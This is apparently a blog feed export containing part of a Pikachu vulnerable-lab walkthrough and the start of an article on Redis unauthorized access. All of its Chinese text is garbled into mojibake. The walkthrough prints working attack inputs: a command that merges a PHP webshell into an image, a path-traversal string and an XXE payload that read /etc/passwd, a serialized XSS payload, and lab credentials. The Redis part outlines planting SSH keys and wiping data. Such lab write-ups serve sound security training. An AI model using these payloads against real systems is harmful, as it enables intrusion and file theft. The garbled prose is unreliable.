audio/midi,audio/x-midiRealAudioéŸ³ä¹æ–‡ä»¶ </span><br><span class="line">.ra, .ram audio/x-pn-realaudioMPEGæ–‡ä»¶ </span><br><span class="line">.mpg,.mpeg video/mpegAVIæ–‡ä»¶ </span><br><span class="line">.avi video/x-msvideoGZIPæ–‡ä»¶ </span><br><span class="line">.gz application/x-gzipTARæ–‡ä»¶ </span><br><span class="line">.tar application/x-tar</span><br></pre></td></tr></table></figure>

<img src="/2021/04/28/Pikachu/image-20210427172741958.png" class>

<h3 id="03-getimagesize"><a href="#03-getimagesize" class="headerlink" title="03.getimagesize"></a>03.getimagesize</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">è¿™ä¸ªå‡½æ•°åŠŸèƒ½ä¼šå¯¹ç›®æ ‡æ–‡ä»¶çš„16è¿›åˆ¶å»è¿›è¡Œä¸€ä¸ªè¯»å–ï¼Œ</span><br><span class="line">å»è¯»å–å¤´å‡ ä¸ªå­—ç¬¦ä¸²æ˜¯ä¸æ˜¯ç¬¦åˆå›¾ç‰‡çš„è¦æ±‚çš„,</span><br><span class="line">æ‰€ä»¥ä¸èƒ½é€šè¿‡ä¿®æ”¹content-typeæ¥è¾¾åˆ°ç›®çš„ï¼Œ</span><br><span class="line">éœ€è¦å°†ä¸€å¥è¯æ”¾å…¥ä¸€å¼ çœŸæ­£çš„å›¾ç‰‡    copy shell.jpg/b + shell.php/b shell.jpg</span><br></pre></td></tr></table></figure>

<img src="/2021/04/28/Pikachu/image-20210427205034653.png" class>

<p><code>åŒ…å«è¿™ä¸ªå›¾ç‰‡é©¬ï¼Œå†ç”¨èšå‰‘è¿æ¥</code></p>
<h2 id="0x09-è¶Šæƒ"><a href="#0x09-è¶Šæƒ" class="headerlink" title="0x09.è¶Šæƒ"></a>0x09.è¶Šæƒ</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">å¦‚æœä½¿ç”¨Aç”¨æˆ·çš„æƒé™å»æ“ä½œBç”¨æˆ·çš„æ•°æ®ï¼ŒAçš„æƒé™å°äºBçš„æƒé™ï¼Œ</span><br><span class="line">å¦‚æœèƒ½å¤ŸæˆåŠŸæ“ä½œï¼Œåˆ™ç§°ä¹‹ä¸ºè¶Šæƒæ“ä½œã€‚ è¶Šæƒæ¼æ´å½¢æˆçš„åŸå› æ˜¯åå°ä½¿ç”¨äº†ä¸åˆç†çš„æƒé™æ ¡éªŒè§„åˆ™å¯¼è‡´çš„ã€‚</span><br><span class="line">ä¸€èˆ¬è¶Šæƒæ¼æ´å®¹æ˜“å‡ºç°åœ¨æƒé™é¡µé¢ï¼ˆéœ€è¦ç™»å½•çš„é¡µé¢ï¼‰å¢ã€åˆ ã€æ”¹ã€æŸ¥çš„çš„åœ°æ–¹ï¼Œ</span><br><span class="line">å½“ç”¨æˆ·å¯¹æƒé™é¡µé¢å†…çš„ä¿¡æ¯è¿›è¡Œè¿™äº›æ“ä½œæ—¶ï¼Œåå°éœ€è¦å¯¹ å¯¹å½“å‰ç”¨æˆ·çš„æƒé™è¿›è¡Œæ ¡éªŒï¼Œ</span><br><span class="line">çœ‹å…¶æ˜¯å¦å…·å¤‡æ“ä½œçš„æƒé™ï¼Œä»è€Œç»™å‡ºå“åº”ï¼Œè€Œå¦‚æœæ ¡éªŒçš„è§„åˆ™è¿‡äºç®€å•åˆ™å®¹æ˜“å‡ºç°è¶Šæƒæ¼æ´ã€‚</span><br><span class="line">å› æ­¤ï¼Œåœ¨åœ¨æƒé™ç®¡ç†ä¸­åº”è¯¥éµå®ˆï¼š</span><br><span class="line">1.ä½¿ç”¨æœ€å°æƒé™åŸåˆ™å¯¹ç”¨æˆ·è¿›è¡Œèµ‹æƒ;</span><br><span class="line">2.ä½¿ç”¨åˆç†ï¼ˆä¸¥æ ¼ï¼‰çš„æƒé™æ ¡éªŒè§„åˆ™;</span><br><span class="line">3.ä½¿ç”¨åå°ç™»å½•æ€ä½œä¸ºæ¡ä»¶è¿›è¡Œæƒé™åˆ¤æ–­,åˆ«åŠ¨ä¸åŠ¨å°±çç”¨å‰ç«¯ä¼ è¿›æ¥çš„æ¡ä»¶ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="01-æ°´å¹³è¶Šæƒ"><a href="#01-æ°´å¹³è¶Šæƒ" class="headerlink" title="01.æ°´å¹³è¶Šæƒ"></a>01.æ°´å¹³è¶Šæƒ</h3><p><code>ä¿®æ”¹usernameå€¼å¯ä»¥å‘ç°å¯ä»¥æŸ¥çœ‹ä»»æ„ç”¨æˆ·ä¿¡æ¯</code></p>
<h3 id="02-å‚ç›´è¶Šæƒ"><a href="#02-å‚ç›´è¶Šæƒ" class="headerlink" title="02.å‚ç›´è¶Šæƒ"></a>02.å‚ç›´è¶Šæƒ</h3><p><code>ä½¿ç”¨pikachuç™»å…¥è®¿é—®vul/overpermission/op2/op2_admin_edit.php</code></p>
<img src="/2021/04/28/Pikachu/image-20210427212129726.png" class>

<h2 id="0x10-ç›®å½•éå†"><a href="#0x10-ç›®å½•éå†" class="headerlink" title="0x10.ç›®å½•éå†"></a>0x10.ç›®å½•éå†</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ç›®å½•éå†æ¼æ´æ¦‚è¿°</span><br><span class="line">åœ¨webåŠŸèƒ½è®¾è®¡ä¸­,å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä¼šè¦å°†éœ€è¦è®¿é—®çš„æ–‡ä»¶å®šä¹‰æˆå˜é‡ï¼Œ</span><br><span class="line">ä»è€Œè®©å‰ç«¯çš„åŠŸèƒ½ä¾¿çš„æ›´åŠ çµæ´»ã€‚ å½“ç”¨æˆ·å‘èµ·ä¸€ä¸ªå‰ç«¯çš„è¯·æ±‚æ—¶ï¼Œ</span><br><span class="line">ä¾¿ä¼šå°†è¯·æ±‚çš„è¿™ä¸ªæ–‡ä»¶çš„å€¼(æ¯”å¦‚æ–‡ä»¶åç§°)ä¼ é€’åˆ°åå°ï¼Œåå°å†æ‰§è¡Œå…¶å¯¹åº”çš„æ–‡ä»¶ã€‚ </span><br><span class="line">åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¦‚æœåå°æ²¡æœ‰å¯¹å‰ç«¯ä¼ è¿›æ¥çš„å€¼è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘ï¼Œ</span><br><span class="line">åˆ™æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡â€œ../â€è¿™æ ·çš„æ‰‹æ®µè®©åå°æ‰“å¼€æˆ–è€…æ‰§è¡Œä¸€äº›å…¶ä»–çš„æ–‡ä»¶ã€‚ </span><br><span class="line">ä»è€Œå¯¼è‡´åå°æœåŠ¡å™¨ä¸Šå…¶ä»–ç›®å½•çš„æ–‡ä»¶ç»“æœè¢«éå†å‡ºæ¥ï¼Œå½¢æˆç›®å½•éå†æ¼æ´ã€‚</span><br><span class="line">çœ‹åˆ°è¿™é‡Œ,ä½ å¯èƒ½ä¼šè§‰å¾—ç›®å½•éå†æ¼æ´å’Œä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½ï¼Œ</span><br><span class="line">ç”šè‡³æ–‡ä»¶åŒ…å«æ¼æ´æœ‰å·®ä¸å¤šçš„æ„æ€ï¼Œ</span><br><span class="line">æ˜¯çš„ï¼Œç›®å½•éå†æ¼æ´å½¢æˆçš„æœ€ä¸»è¦çš„åŸå› è·Ÿè¿™ä¸¤è€…ä¸€æ ·ï¼Œ</span><br><span class="line">éƒ½æ˜¯åœ¨åŠŸèƒ½è®¾è®¡ä¸­å°†è¦æ“ä½œçš„æ–‡ä»¶ä½¿ç”¨å˜é‡çš„ æ–¹å¼ä¼ é€’ç»™äº†åå°ï¼Œ</span><br><span class="line">è€Œåˆæ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘è€Œé€ æˆçš„ï¼Œåªæ˜¯å‡ºç°çš„ä½ç½®æ‰€å±•ç°çš„ç°è±¡ä¸ä¸€æ ·ï¼Œ</span><br><span class="line">å› æ­¤ï¼Œè¿™é‡Œè¿˜æ˜¯å•ç‹¬æ‹¿å‡ºæ¥å®šä¹‰ä¸€ä¸‹ã€‚</span><br><span class="line">éœ€è¦åŒºåˆ†ä¸€ä¸‹çš„æ˜¯,</span><br><span class="line">å¦‚æœä½ é€šè¿‡ä¸å¸¦å‚æ•°çš„urlï¼ˆæ¯”å¦‚ï¼šhttp://xxxx/docï¼‰åˆ—å‡ºäº†docæ–‡ä»¶å¤¹é‡Œé¢æ‰€æœ‰çš„æ–‡ä»¶ï¼Œ</span><br><span class="line">è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬æˆä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚ </span><br><span class="line">è€Œå¹¶ä¸å½’ä¸ºç›®å½•éå†æ¼æ´ã€‚</span><br></pre></td></tr></table></figure>

<blockquote>
<p>?title=../../../../../../../etc/passwd</p>
</blockquote>
<img src="/2021/04/28/Pikachu/image-20210427212801523.png" class>

<h2 id="0x11-æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#0x11-æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="0x11.æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>0x11.æ•æ„Ÿä¿¡æ¯æ³„éœ²</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¦‚è¿°</span><br><span class="line">ç”±äºåå°äººå‘˜çš„ç–å¿½æˆ–è€…ä¸å½“çš„è®¾è®¡ï¼Œå¯¼è‡´ä¸åº”è¯¥è¢«å‰ç«¯ç”¨æˆ·çœ‹åˆ°çš„æ•°æ®è¢«è½»æ˜“çš„è®¿é—®åˆ°ã€‚ </span><br><span class="line">æ¯”å¦‚ï¼š</span><br><span class="line">---é€šè¿‡è®¿é—®urlä¸‹çš„ç›®å½•ï¼Œå¯ä»¥ç›´æ¥åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨;</span><br><span class="line">---è¾“å…¥é”™è¯¯çš„urlå‚æ•°åæŠ¥é”™ä¿¡æ¯é‡Œé¢åŒ…å«æ“ä½œç³»ç»Ÿã€ä¸­é—´ä»¶ã€å¼€å‘è¯­è¨€çš„ç‰ˆæœ¬æˆ–å…¶ä»–ä¿¡æ¯;</span><br><span class="line">---å‰ç«¯çš„æºç ï¼ˆhtml,css,jsï¼‰é‡Œé¢åŒ…å«äº†æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚åå°ç™»å½•åœ°å€ã€å†…ç½‘æ¥å£ä¿¡æ¯ã€ç”šè‡³è´¦å·å¯†ç ç­‰;</span><br><span class="line">ç±»ä¼¼ä»¥ä¸Šè¿™äº›æƒ…å†µï¼Œæˆ‘ä»¬æˆä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚</span><br><span class="line">æ•æ„Ÿä¿¡æ¯æ³„éœ²è™½ç„¶ä¸€ç›´è¢«è¯„ä¸ºå±å®³æ¯”è¾ƒä½çš„æ¼æ´ï¼Œ</span><br><span class="line">ä½†è¿™äº›æ•æ„Ÿä¿¡æ¯å¾€å¾€ç»™æ”»å‡»ç€å®æ–½è¿›ä¸€æ­¥çš„æ”»å‡»æä¾›å¾ˆå¤§çš„å¸®åŠ©,</span><br><span class="line">ç”šè‡³â€œç¦»è°±â€çš„æ•æ„Ÿä¿¡æ¯æ³„éœ²ä¹Ÿä¼šç›´æ¥é€ æˆä¸¥é‡çš„æŸå¤±ã€‚ </span><br><span class="line">å› æ­¤,åœ¨webåº”ç”¨çš„å¼€å‘ä¸Šï¼Œé™¤äº†è¦è¿›è¡Œå®‰å…¨çš„ä»£ç ç¼–å†™ï¼Œ</span><br><span class="line">ä¹Ÿéœ€è¦æ³¨æ„å¯¹æ•æ„Ÿä¿¡æ¯çš„åˆç†å¤„ç†ã€‚</span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹æºç å‘ç°ç”¨æˆ· lili/123456</code></p>
<h2 id="0x12-PHPååºåˆ—åŒ–"><a href="#0x12-PHPååºåˆ—åŒ–" class="headerlink" title="0x12.PHPååºåˆ—åŒ–"></a>0x12.PHPååºåˆ—åŒ–</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">åœ¨ç†è§£è¿™ä¸ªæ¼æ´å‰,ä½ éœ€è¦å…ˆææ¸…æ¥šphpä¸­serialize()ï¼Œunserialize()è¿™ä¸¤ä¸ªå‡½æ•°ã€‚</span><br><span class="line"></span><br><span class="line">åºåˆ—åŒ–serialize()</span><br><span class="line">åºåˆ—åŒ–è¯´é€šä¿—ç‚¹å°±æ˜¯æŠŠä¸€ä¸ªå¯¹è±¡å˜æˆå¯ä»¥ä¼ è¾“çš„å­—ç¬¦ä¸²,æ¯”å¦‚ä¸‹é¢æ˜¯ä¸€ä¸ªå¯¹è±¡:</span><br><span class="line">    class S&#123;</span><br><span class="line">        public $test=&quot;pikachu&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $s=new S(); //åˆ›å»ºä¸€ä¸ªå¯¹è±¡</span><br><span class="line">    serialize($s); //æŠŠè¿™ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–</span><br><span class="line">    åºåˆ—åŒ–åå¾—åˆ°çš„ç»“æœæ˜¯è¿™ä¸ªæ ·å­çš„:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span><br><span class="line">        O:ä»£è¡¨object</span><br><span class="line">        1:ä»£è¡¨å¯¹è±¡åå­—é•¿åº¦ä¸ºä¸€ä¸ªå­—ç¬¦</span><br><span class="line">        S:å¯¹è±¡çš„åç§°</span><br><span class="line">        1:ä»£è¡¨å¯¹è±¡é‡Œé¢æœ‰ä¸€ä¸ªå˜é‡</span><br><span class="line">        s:æ•°æ®ç±»å‹</span><br><span class="line">        4:å˜é‡åç§°çš„é•¿åº¦</span><br><span class="line">        test:å˜é‡åç§°</span><br><span class="line">        s:æ•°æ®ç±»å‹</span><br><span class="line">        7:å˜é‡å€¼çš„é•¿åº¦</span><br><span class="line">        pikachu:å˜é‡å€¼</span><br><span class="line">    </span><br><span class="line">ååºåˆ—åŒ–unserialize()</span><br><span class="line">å°±æ˜¯æŠŠè¢«åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸä¸ºå¯¹è±¡,ç„¶ååœ¨æ¥ä¸‹æ¥çš„ä»£ç ä¸­ç»§ç»­ä½¿ç”¨ã€‚</span><br><span class="line"></span><br><span class="line">    $u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);</span><br><span class="line">    echo $u-&gt;test; //å¾—åˆ°çš„ç»“æœä¸ºpikachu</span><br><span class="line">    </span><br><span class="line">åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœ¬èº«æ²¡æœ‰é—®é¢˜,ä½†æ˜¯å¦‚æœååºåˆ—åŒ–çš„å†…å®¹æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„,ä¸”åå°ä¸æ­£å½“çš„ä½¿ç”¨äº†PHPä¸­çš„é­”æ³•å‡½æ•°,å°±ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜</span><br><span class="line"></span><br><span class="line">        å¸¸è§çš„å‡ ä¸ªé­”æ³•å‡½æ•°:</span><br><span class="line">        __construct()å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">        __destruct()å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">        __toString()å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨</span><br><span class="line"></span><br><span class="line">        __sleep() åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ</span><br><span class="line"></span><br><span class="line">        __wakeupå°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">        æ¼æ´ä¸¾ä¾‹:</span><br><span class="line"></span><br><span class="line">        class S&#123;</span><br><span class="line">            var $test = &quot;pikachu&quot;;</span><br><span class="line">            function __destruct()&#123;</span><br><span class="line">                echo $this-&gt;test;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $s = $_GET[&#x27;test&#x27;];</span><br><span class="line">        @$unser = unserialize($a);</span><br><span class="line"></span><br><span class="line">        payload:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x13-XXE"><a href="#0x13-XXE" class="headerlink" title="0x13.XXE"></a>0x13.XXE</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">XXE -&quot;xml external entity injection&quot;</span><br><span class="line">æ—¢&quot;xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´&quot;ã€‚</span><br><span class="line">æ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯</span><br><span class="line">&quot;æ”»å‡»è€…é€šè¿‡å‘æœåŠ¡å™¨æ³¨å…¥æŒ‡å®šçš„xmlå®ä½“å†…å®¹,ä»è€Œè®©æœåŠ¡å™¨æŒ‰ç…§æŒ‡å®šçš„é…ç½®è¿›è¡Œæ‰§è¡Œ,å¯¼è‡´é—®é¢˜&quot;</span><br><span class="line">ä¹Ÿå°±æ˜¯è¯´æœåŠ¡ç«¯æ¥æ”¶å’Œè§£æäº†æ¥è‡ªç”¨æˆ·ç«¯çš„xmlæ•°æ®,</span><br><span class="line">è€Œåˆæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶,ä»è€Œå¯¼è‡´xmlå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚</span><br><span class="line"></span><br><span class="line">å…·ä½“çš„å…³äºxmlå®ä½“çš„ä»‹ç»,ç½‘ç»œä¸Šæœ‰å¾ˆå¤š,è‡ªå·±åŠ¨æ‰‹å…ˆæŸ¥ä¸€ä¸‹ã€‚</span><br><span class="line">ç°åœ¨å¾ˆå¤šè¯­è¨€é‡Œé¢å¯¹åº”çš„è§£æxmlçš„å‡½æ•°é»˜è®¤æ˜¯ç¦æ­¢è§£æå¤–éƒ¨å®ä½“å†…å®¹çš„,ä»è€Œä¹Ÿå°±ç›´æ¥é¿å…äº†è¿™ä¸ªæ¼æ´ã€‚</span><br><span class="line">ä»¥PHPä¸ºä¾‹,åœ¨PHPé‡Œé¢è§£æxmlç”¨çš„æ˜¯libxml,å…¶åœ¨â‰¥2.9.0çš„ç‰ˆæœ¬ä¸­,é»˜è®¤æ˜¯ç¦æ­¢è§£æxmlå¤–éƒ¨å®ä½“å†…å®¹çš„ã€‚</span><br><span class="line"></span><br><span class="line">æœ¬ç« æä¾›çš„æ¡ˆä¾‹ä¸­,ä¸ºäº†æ¨¡æ‹Ÿæ¼æ´,é€šè¿‡æ‰‹åŠ¨æŒ‡å®šLIBXML_NOENTé€‰é¡¹å¼€å¯äº†xmlå¤–éƒ¨å®ä½“è§£æã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;  encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
<img src="/2021/04/28/Pikachu/image-20210428085543239.png" class>

<h2 id="0x14-URLé‡å®šå‘"><a href="#0x14-URLé‡å®šå‘" class="headerlink" title="0x14.URLé‡å®šå‘"></a>0x14.URLé‡å®šå‘</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ä¸å®‰å…¨çš„urlè·³è½¬</span><br><span class="line"></span><br><span class="line">ä¸å®‰å…¨çš„urlè·³è½¬é—®é¢˜å¯èƒ½å‘ç”Ÿåœ¨ä¸€åˆ‡æ‰§è¡Œäº†urlåœ°å€è·³è½¬çš„åœ°æ–¹ã€‚</span><br><span class="line">å¦‚æœåç«¯é‡‡ç”¨äº†å‰ç«¯ä¼ è¿›æ¥çš„(å¯èƒ½æ˜¯ç”¨æˆ·ä¼ å‚,æˆ–è€…ä¹‹å‰é¢„åŸ‹åœ¨å‰ç«¯é¡µé¢çš„urlåœ°å€)å‚æ•°ä½œä¸ºäº†è·³è½¬çš„ç›®çš„åœ°,è€Œåˆæ²¡æœ‰åšåˆ¤æ–­çš„è¯</span><br><span class="line">å°±å¯èƒ½å‘ç”Ÿ&quot;è·³é”™å¯¹è±¡&quot;çš„é—®é¢˜ã€‚</span><br><span class="line"></span><br><span class="line">urlè·³è½¬æ¯”è¾ƒç›´æ¥çš„å±å®³æ˜¯:</span><br><span class="line"><span class="meta">--&gt;</span><span class="bash">é’“é±¼,æ—¢æ”»å‡»è€…ä½¿ç”¨æ¼æ´æ–¹çš„åŸŸå(æ¯”å¦‚ä¸€ä¸ªæ¯”è¾ƒå‡ºåçš„å…¬å¸åŸŸåå¾€å¾€ä¼šè®©ç”¨æˆ·æ”¾å¿ƒçš„ç‚¹å‡»)åšæ©ç›–,è€Œæœ€ç»ˆè·³è½¬çš„ç¡®å®é’“é±¼ç½‘ç«™</span></span><br></pre></td></tr></table></figure>

<h2 id="0x15-SSRF"><a href="#0x15-SSRF" class="headerlink" title="0x15.SSRF"></a>0x15.SSRF</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )</span><br><span class="line">å…¶å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½,ä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶</span><br><span class="line"></span><br><span class="line">å¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘èµ·è¯·æ±‚,å¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ®</span><br><span class="line"></span><br><span class="line">æ•°æ®æµ:æ”»å‡»è€…-----&gt;æœåŠ¡å™¨----&gt;ç›®æ ‡åœ°å€</span><br><span class="line"></span><br><span class="line">æ ¹æ®åå°ä½¿ç”¨çš„å‡½æ•°çš„ä¸åŒ,å¯¹åº”çš„å½±å“å’Œåˆ©ç”¨æ–¹æ³•åˆæœ‰ä¸ä¸€æ ·</span><br><span class="line">PHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF:</span><br><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br><span class="line">            </span><br><span class="line">å¦‚æœä¸€å®šè¦é€šè¿‡åå°æœåŠ¡å™¨è¿œç¨‹å»å¯¹ç”¨æˆ·æŒ‡å®š(&quot;æˆ–è€…é¢„åŸ‹åœ¨å‰ç«¯çš„è¯·æ±‚&quot;)çš„åœ°å€è¿›è¡Œèµ„æºè¯·æ±‚,åˆ™è¯·åšå¥½ç›®æ ‡åœ°å€çš„è¿‡æ»¤ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="01-SSRF-curl"><a href="#01-SSRF-curl" class="headerlink" title="01.SSRF(curl)"></a>01.SSRF(curl)</h3><p><code>å¯ä»¥æµ‹å¼€æ”¾çš„ç«¯å£</code></p>
<img src="/2021/04/28/Pikachu/image-20210428091315523.png" class>

<h3 id="02-SSRF-file-get-content"><a href="#02-SSRF-file-get-content" class="headerlink" title="02.SSRF(file_get_content)"></a>02.SSRF(file_get_content)</h3><img src="/2021/04/28/Pikachu/image-20210428141007433.png" class>]]></content>
      <categories>
        <category>Webé¶åœº</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Redisæœªæˆæƒè®¿é—®</title>
    <url>/2021/07/19/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
    <content><![CDATA[<h1 id="Redisæœªæˆæƒè®¿é—®æ¼æ´"><a href="#Redisæœªæˆæƒè®¿é—®æ¼æ´" class="headerlink" title="Redisæœªæˆæƒè®¿é—®æ¼æ´"></a>Redisæœªæˆæƒè®¿é—®æ¼æ´</h1><h2 id="ä¸€ã€æ¼æ´ç®€ä»‹"><a href="#ä¸€ã€æ¼æ´ç®€ä»‹" class="headerlink" title="ä¸€ã€æ¼æ´ç®€ä»‹"></a>ä¸€ã€æ¼æ´ç®€ä»‹</h2><blockquote>
<p>Redisé»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨0.0.0.0:6379(åœ¨redis3.2ä¹‹åï¼Œrediså¢åŠ äº†protected-modeï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹ï¼Œéç»‘å®šIPæˆ–è€…æ²¡æœ‰é…ç½®å¯†ç è®¿é—®æ—¶éƒ½ä¼šæŠ¥é”™)ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç­‰ï¼Œè¿™æ ·å°†ä¼šå°†RedisæœåŠ¡æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯(é»˜è®¤ä¸ºç©º)çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—®Redisä»¥åŠè¯»å–Redisçš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—®Redisçš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨Redisè‡ªèº«çš„æä¾›çš„configå‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…è¿˜å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„/root/.sshæ–‡ä»¶çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡å™¨ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚</p>
<p>æ¼æ´çš„äº§ç”Ÿæ¡ä»¶æœ‰ä»¥ä¸‹ä¸¤ç‚¹:</p>
<p>(1)  Redisç»‘å®šåœ¨0.0.0.0:6379,ä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç›¸å…³å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘</p>
<p>(2)  æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆé»˜è®¤ä¸ºç©ºï¼‰æˆ–è€…å¼±å¯†ç ï¼Œå¯ä»¥å…å¯†ç ç™»å½•redisæœåŠ¡</p>
</blockquote>
<a id="more"></a>

<h2 id="äºŒã€å½±å“èŒƒå›´"><a href="#äºŒã€å½±å“èŒƒå›´" class="headerlink" title="äºŒã€å½±å“èŒƒå›´"></a>äºŒã€å½±å“èŒƒå›´</h2><p>Redis 2.xï¼Œ3.xï¼Œ4.xï¼Œ5.x</p>
<h2 id="ä¸‰ã€æ¼æ´å±å®³"><a href="#ä¸‰ã€æ¼æ´å±å®³" class="headerlink" title="ä¸‰ã€æ¼æ´å±å®³"></a>ä¸‰ã€æ¼æ´å±å®³</h2><p>(1) æ”»å‡»è€…æ— éœ€è®¤è¯è®¿é—®åˆ°å†…éƒ¨æ•°æ®,å¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œé»‘å®¢ä¹Ÿå¯ä»¥æ¶æ„æ‰§è¡Œflushallæ¥æ¸…ç©ºæ‰€æœ‰æ•°æ®</p>
<p>(2) æ”»å‡»è€…å¯é€šè¿‡evalæ‰§è¡Œluaä»£ç ï¼Œæˆ–é€šè¿‡æ•°æ®å¤‡ä»½åŠŸèƒ½å¾€ç£ç›˜å†™å…¥åé—¨æ–‡ä»¶</p>
<p>(3) å¦‚æœredisä»¥rootèº«ä»½è¿è¡Œï¼Œé»‘å®¢å¯ä»¥ç»™rootè´¦æˆ·å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡SSHç™»å½•ç›®æ ‡æœåŠ¡å™¨ </p>
